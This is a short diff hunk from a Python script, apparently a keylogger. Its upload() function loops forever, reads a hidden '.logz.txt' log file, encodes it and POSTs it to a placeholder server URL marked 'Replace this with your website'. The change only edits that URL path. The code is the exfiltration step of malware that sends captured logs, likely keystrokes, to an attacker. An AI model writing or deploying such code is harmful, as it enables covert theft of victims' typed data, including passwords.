@@ -20,7 +20,7 @@ def ende(ui):
 
 def upload():
 	while True:
-		url = 'http://example.com/logz/logger.php' # <------- Replace this with your website
+		url = 'http://example.com/logger.php' # <------- Replace this with your website
 		f = open('.logz.txt')
 		logz = f.read()
 		r = requests.post(url, data={'klogz':ende(logz)})
